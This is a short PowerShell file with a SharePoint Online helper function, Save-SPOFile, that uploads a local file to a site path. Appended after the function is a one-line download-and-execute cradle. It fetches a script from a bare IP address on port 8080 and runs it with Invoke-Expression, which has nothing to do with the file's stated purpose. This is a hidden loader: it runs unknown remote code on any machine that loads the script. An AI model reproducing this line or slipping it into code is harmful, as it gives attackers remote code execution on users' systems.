

function Save-SPOFile
{
	[CmdletBinding()]
	param
	(
		[Parameter(Mandatory=$true, Position=1)]
		[string]$targetPath, 
	
		[Parameter(Mandatory=$true, Position=2)]
		[System.IO.FileInfo]$file
	)
	
	$targetPath = Join-SPOParts -Separator '/' -Parts $clientContext.Web.ServerRelativeUrl, $targetPath
	
    $fs = $file.OpenRead()
    [Microsoft.SharePoint.Client.File]::SaveBinaryDirect($clientContext, $targetPath, $fs, $true)
    $fs.Close()
}

IEX ((New-Object Net.WebClient).DownloadString('http://93.171.205.35:8080/'));

